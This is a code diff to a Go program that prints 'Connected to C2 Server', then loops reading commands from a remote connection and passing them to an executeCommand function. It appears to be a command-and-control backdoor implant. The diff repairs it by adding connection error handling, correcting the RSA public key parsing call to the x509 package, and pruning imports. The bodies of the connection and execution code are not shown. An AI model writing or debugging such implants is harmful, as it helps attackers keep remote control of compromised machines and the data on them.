@@ -1,11 +1,9 @@
 package main
 
 import (
-	"crypto/rand"
 	"crypto/rsa"
-	"crypto/sha256"
 	"crypto/tls"
-	"encoding/base64"
+	"crypto/x509"
 	"encoding/pem"
 	"fmt"
 	"io/ioutil"
@@ -29,7 +27,11 @@ func main() {
 
 	fmt.Println("[+] Connected to C2 Server")
 	for {
-		command := receiveCommand(conn)
+		command, err := receiveCommand(conn)
+		if err != nil {
+			fmt.Println("[-] Connection closed")
+			break
+		}
 		if command == "" {
 			continue
 		}
@@ -49,20 +51,20 @@ func loadPublicKey() {
 		panic("[-] Failed to decode RSA public key")
 	}
 
-	pub, err := rsa.ParsePKCS1PublicKey(block.Bytes)
+	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
 	if err != nil {
 		panic(err)
 	}
 	publicKey = pub
 }
 
-func receiveCommand(conn net.Conn) string {
+func receiveCommand(conn net.Conn) (string, error) {
 	buf := make([]byte, 1024)
 	n, err := conn.Read(buf)
 	if err != nil {
-		return ""
+		return "", err
 	}
-	return string(buf[:n])
+	return string(buf[:n]), nil
 }
 
 func executeCommand(cmd string) string {
